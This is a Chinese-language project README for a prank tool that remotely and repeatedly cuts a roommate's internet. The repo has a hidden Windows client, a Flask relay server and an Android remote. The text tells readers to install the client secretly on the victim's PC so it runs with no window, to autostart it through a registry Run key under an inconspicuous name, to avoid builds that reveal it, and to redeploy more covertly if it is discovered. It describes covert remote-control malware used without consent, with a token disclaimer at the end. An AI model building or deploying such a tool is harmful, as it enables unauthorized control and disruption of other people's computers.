# Shut-the-fuck-up

**草，远程让舍友闭嘴神器。**

舍友半夜打游戏嗷嗷叫？论文写到一半他在那外放抖音？  
别跟他废话。手机点一下，**他的电脑就按你设定的节奏：联网 → 断网 → 联网 → 断网**，  
该掉线掉线，该卡死卡死，**让他自己哇哇叫去**。

> 本质：Android App 远程控制 Windows 电脑，固定间隔脉冲式断网/恢复。  
> 你也可以正经用——比如定时联网同步数据。但谁心里没点数呢。

[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Android-blue)](#)
[![Server](https://img.shields.io/badge/Server-Python%20Flask-green)](#)
[![Vibe](https://img.shields.io/badge/Vibe-舍友必疯-red)](#)

---

## 这玩意儿能干啥

| 组件 | 干啥的 |
|------|--------|
| **Windows 客户端** (`main.cpp`) | 悄悄装舍友电脑上，无窗口、开机自启，像幽灵一样蹲后台 |
| **控制服务器** (`server/`) | 中转站，你手机发指令，它告诉舍友电脑该干啥 |
| **Android App** (`android/Shut-the-fuck-up/`) | 你的遥控器：**开整 / 停手 / 调间隔 / 看状态** |

**开启之后舍友电脑会：**

```
有网 15 秒 → 断网 → 有网 15 秒 → 断网 → ……
```

游戏掉线、语音中断、下载归零——**物理层面的「闭嘴」**。

---

## 作战架构

```
     你的手机                         云服务器                    舍友的破电脑
  ┌─────────────┐    POST 开整/停手     ┌──────────────┐    GET 轮询    ┌─────────────┐
  │ Android App │ ────────────────────▶ │  server.py   │ ◀──────────── │ Shut-the-fuck-up.exe │
  │  （遥控器）  │                       │   :8000      │               │ （受害者）   │
  └─────────────┘                       └──────────────┘               └─────────────┘
```

**标准操作流程：**

1. 云服务器跑起来 `server.py`（别省这点钱，要远程控就得有公网）
2. 舍友电脑装上编译好的 `Shut-the-fuck-up.exe`（建议 Release，别闪黑框穿帮）
3. 你手机 App 点 **「开启」** → 服务器：`state = start`
4. 舍友电脑每 2 秒问一次服务器，收到 start 就开始 **联网→等 N 秒→断网→循环**
5. 你爽够了点 **「关闭」** → 停止折磨，网络恢复正常（显得你很大度）

---

## 目录结构

```
Shut-the-fuck-up/
├── main.cpp              # Windows 客户端源码
├── Shut-the-fuck-up.vcxproj      # VS 工程
├── Shut-the-fuck-up.sln          # VS 解决方案
├── server/
│   ├── server.py
│   └── requirements.txt
└── android/
    └── Shut-the-fuck-up/         # Android Studio 工程
```

---

## 开整指南

### 第一步：把服务器架起来

```bash
cd server
pip install -r requirements.txt
python server.py
```

监听 `0.0.0.0:8000`，**安全组记得放行 8000 端口**，不然手机够不着。

后台挂机（Linux）：

```bash
nohup python server.py > server.log 2>&1 &
```

验货：

```bash
curl http://YOUR_SERVER_IP:8000/get_state
# {"state":"stop"}  ← 还没开整，舍友暂时安全
```

---

### 第二步：编译舍友电脑端

**需要：** Windows 10/11 + Visual Studio 2022 + Windows SDK

**改配置**（`main.cpp` 顶部，别偷懒）：

```cpp
const char* SERVER_HOST = "YOUR_SERVER_IP";   // 你的服务器 IP，别填 127.0.0.1
const int SERVER_PORT = 8000;
const wchar_t* APP_REG_NAME = L"ShutTheFuckUp"; // 自启动注册表名，可改成不起眼的名字
```

**编译：**

1. 打开 `Shut-the-fuck-up.sln` 或 `Shut-the-fuck-up.vcxproj`
2. **Release | x64**（Debug 会闪黑框，容易暴露）
3. 生成 → 输出 `x64/Release/Shut-the-fuck-up.exe`

**部署：**

- 扔到舍友电脑跑一遍（或开机自启）
- **无窗口**，任务管理器里能看到进程
- 首次运行自动写注册表自启动
- 关机时会自动恢复网络，别留烂摊子

**收手（取消自启动）：**

`regedit` → `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` → 删 `ShutTheFuckUp`

---

### 第三步：编译你的遥控 App

**需要：** Android Studio + JDK 17

改默认服务器（`strings.xml`）：

```xml
<string name="server_default">http://YOUR_SERVER_IP:8000</string>
```

编译 APK：

1. Android Studio 打开 `android/Shut-the-fuck-up`
2. Build → Build APK(s)
3. 装自己手机上

App 里也能临时改服务器地址，不用每次都重编译。

---

## API 速查（给会 curl 的人）

| 接口 | 方法 | 干啥 | 返回示例 |
|------|------|------|----------|
| `/get_state` | GET | 现在在不在折磨 | `{"state":"stop"}` |
| `/get_interval` | GET | 每次给网多少秒 | `{"interval":30}` |
| `/set_state` | POST | **开整** / **停手** | `POST /set_state?state=start` |
| `/set_interval` | POST | 调间隔，越短越疯 | `POST /set_interval?interval=15` |

**Python 一键开整：**

```python
import requests

BASE = "http://YOUR_SERVER_IP:8000"

requests.post(f"{BASE}/set_state", params={"state": "start"})      # 开整
requests.post(f"{BASE}/set_interval", params={"interval": 15})     # 15 秒给口网
requests.post(f"{BASE}/set_state", params={"state": "stop"})       # 收手
```

---

## 配置项一览

| 改哪儿 | 改啥 | 备注 |
|--------|------|------|
| `main.cpp` | `SERVER_HOST` | 服务器 IP，填错等于白装 |
| `main.cpp` | `APP_REG_NAME` | 自启动名，建议起个低调的 |
| `strings.xml` | `server_default` | App 默认服务器 |
| `server.py` | `interval` 初始值 | 默认给网 30 秒 |

---

## 翻车了咋办

**App 点开启没反应？**

- 服务器跑了吗？手机浏览器能打开 `http://IP:8000/get_state` 吗？
- 舍友电脑上 `Shut-the-fuck-up.exe` 在跑吗？（没装客户端你按烂手机也没用）
- `/get_state` 是不是 `"start"`？

**App 显示运行中，舍友电脑没动静？**

- `SERVER_HOST` 填错或舍友电脑连不上公网
- 进程被杀了——可能被发现，换隐蔽点的部署方式

**重启闪黑框？**

- 用 **Release | x64**，别用 Debug
- 确认自启动指向的是新编译的 exe

**舍友发现了要卸载？**

1. 任务管理器杀进程
2. 删注册表 Run 项
3. 删 exe

**你良心发现要停？**

App 点 **关闭**，或 `POST /set_state?state=stop`，网络会恢复。

---

## 技术细节（给懂行的）

- `IpRenewAddress` / `IpReleaseAddress` 控制 DHCP 网卡，有线 WiFi 一起动
- 无 GUI，`HWND_MESSAGE` 收关机消息，退出前自动 `ReconnectNetwork()`
- Flask 内存存状态，服务器重启后恢复 `stop`，舍友暂时安全

---

## 免责声明

**仅供宿舍友好（或不友好）交流与学习研究。**

- 请只在**你有权操作的设备**上使用
- 未授权控制他人电脑/网络可能违法，**后果自负**
- 舍友打你别找我

---

## License

MIT — 随便 fork，记得 star 一下让作者知道又坑了一个舍友。
